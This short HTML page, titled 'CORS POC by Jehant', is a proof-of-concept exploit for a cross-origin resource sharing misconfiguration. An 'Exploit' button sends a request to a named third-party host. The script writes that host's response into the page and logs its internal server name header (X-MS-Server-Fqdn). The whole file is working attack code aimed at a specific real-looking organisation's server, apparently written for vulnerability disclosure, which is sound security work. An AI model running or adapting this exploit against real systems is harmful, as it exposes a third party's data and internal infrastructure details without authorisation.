<html>
  <head>
    <script>
      function cors(){
      const client = new XMLHttpRequest();
      client.open("GET", "https://lyncdiscover.bordgais.ie/", true);
      client.send();

      client.onreadystatechange = function () {
        if(this.readyState == 4 && this.status == 200) {
         document.getElementById("demo").innerHTML = this.responseText;
      }
        if (this.readyState == this.HEADERS_RECEIVED) {
          const recievedHeader = client.getResponseHeader("X-MS-Server-Fqdn");
            console.log(recievedHeader);
        }
      };
    }
    </script>
  </head>
  <body>
    <center>
    <h1>CORS POC by Jehant</h1> 
    <div id="demo">
      <button type="button" onclick="cors()">Exploit</button>
      </div>
    </center>
  </body>
</html>
